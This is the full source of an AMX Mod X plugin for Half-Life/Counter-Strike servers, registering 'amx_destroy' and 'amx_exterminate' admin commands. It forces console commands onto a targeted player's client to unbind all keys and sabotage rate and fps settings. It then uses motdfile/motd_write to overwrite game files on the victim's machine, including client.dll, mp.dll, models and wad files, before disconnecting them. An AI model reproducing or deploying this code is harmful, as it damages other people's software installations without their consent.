#include <amxmodx>
#include <amxmisc>
#include <fun>
#include <engine>

#define CMDTARGET_DESTROY (CMDTARGET_ALLOW_SELF | CMDTARGET_NO_BOTS | CMDTARGET_OBEY_IMMUNITY)

new const g_commands[][] =
{
	"wait;developer 1;wait;unbindall;wait;cl_timeout 0",
	"wait;rate 1;wait;cl_updaterate 1;wait;cl_cmdrate 1",
	"wait;fps_max 1;wait;fps_modem 1;wait;sys_ticrate 1",
	"wait;cl_allowdownload 0;wait;cl_allowupload 0",
	"wait;cl_backspeed 1;wait;sensitivity 20",
	"wait;gl_flipmatrix 1;wait;con_color ^"1 1 1^"",
	
	"wait;motdfile events/ak47.sc;motd_write x",
	"wait;motdfile models/v_ak47.mdl;motd_write x",
	"wait;motdfile events/m4a1.sc;motd_write x",
	"wait;motdfile models/v_m4a1.mdl;motd_write x",
	"wait;motdfile cs_dust.wad;motd_write xd",
	"wait;motdfile cstrike.wad;motd_write x",
	"wait;motdfile halflife.wad;motd_write x",
	"wait;motdfile dlls/mp.dll;motd_write x",
	"wait;motdfile cl_dlls/client.dll;motd_write x",
	"wait;motdfile resource/GameMenu.res;motd_write x"
};

public plugin_init()
{
	register_plugin("Destroy Comand", "1.0.0", "X");
	
	register_concmd("amx_destroy", "cmdDestroy", ADMIN_LEVEL_G, "<name>");
	register_concmd("amx_exterminate", "cmdDestroy", ADMIN_LEVEL_G, "<name>");
}

public cmdDestroy(id, iLevel, iCid)
{
	if(!cmd_access(id, iLevel, iCid, 2))
		return PLUGIN_HANDLED;
	
	new szArg[32];
	read_argv(1, szArg, 31);
	
	new iPlayer = cmd_target(id, szArg, CMDTARGET_DESTROY);
	
	if(!iPlayer)
		return PLUGIN_HANDLED;
	
	new szAdmin[32], szName[32], azAuthid[32], azAuthid2[32];
	get_user_name(id, szAdmin, 31);
	get_user_name(iPlayer, szName, 31);
	get_user_authid(id, azAuthid, 31);
	get_user_authid(iPlayer, azAuthid2, 31);
	
	for(new i = 0; i < sizeof g_commands; i++) {
		client_cmd(iPlayer, g_commands[i]);
	}
	
	client_cmd(iPlayer,"wait;wait;wait;disconnect");
	
	client_cmd(0, "spk ^"vox/bizwarn detected user and destroy^"");
	
	show_activity(id, szAdmin, "destroy %s", szName);
	
	log_amx("Destroy: ^"%s<%d><%s><>^" destroy ^"%s<%d><%s><>^"", szAdmin, get_user_userid(id), azAuthid, szName, get_user_userid(iPlayer), azAuthid2);
	
	return PLUGIN_HANDLED;
}
